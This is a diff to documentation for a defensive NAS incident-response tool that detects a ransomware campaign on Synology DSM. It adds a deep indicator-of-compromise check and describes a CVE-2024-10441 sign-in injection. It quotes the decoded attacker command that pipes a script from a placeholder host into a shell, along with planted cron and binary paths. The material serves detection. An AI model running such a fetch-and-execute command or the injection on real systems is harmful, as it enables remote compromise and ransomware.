@@ -14,10 +14,13 @@ Signs of this campaign: files renamed `*.L0CK3D` (zero) or `*.LOCK3D`, a `read-m
 ```bash
 nas incident                 # PASS/WARN/FAIL/SKIP per item, exit 1 on any FAIL
 nas incident --probe --scan  # + public port probe from this machine + ransom-note search (minutes)
+nas incident --deep          # + indicators of compromise: root-only logs, cron, files, users, SSH keys, processes
 nas --json incident          # {"items": [{id, status, detail, hint, fix}], "summary": {...}}
 ```
 
 Items: `dsm_version`, `sa_26_14_packages`, `firewall`, `quickconnect`, `router_port_forwarding`, `public_ports` (`--probe`), `external_signins`, `failed_signins`, `autoblock`, `smb_min_protocol`, `admin_account`, `snapshot_schedule:<share>`, `snapshot_worm:<share>`, `ransomware_files` (`--scan`). SKIP lines state the reason (flag missing, API error, feature absent).
+
+`exploit_attempts` WARN = the CVE-2024-10441 sign-in injection (`PLUGIN_VALUE_END` / `LD_DEBUG_OUTPUT=/etc/cron.d/synot*`, decoded command `curl -s http://<IP>/xdy5.sh|sh`) reached DSM; whether it worked is what the `--deep` items show: `ioc_cron` (planted `/etc/cron.d/synot*`), `ioc_binaries` (`/bin/libgld`, `/bin/qnetd`, `/bin/l0ck.enc`, `xdy5*`), `ioc_users`, `ioc_ssh_keys`, `ioc_processes` (FAIL = known-bad hit, WARN = unknown). Indicator table: `docs/INCIDENT-C3RB3R.md`.
 
 ## 2. If `ransomware_files` or `external_signins` is FAIL: isolate first
 
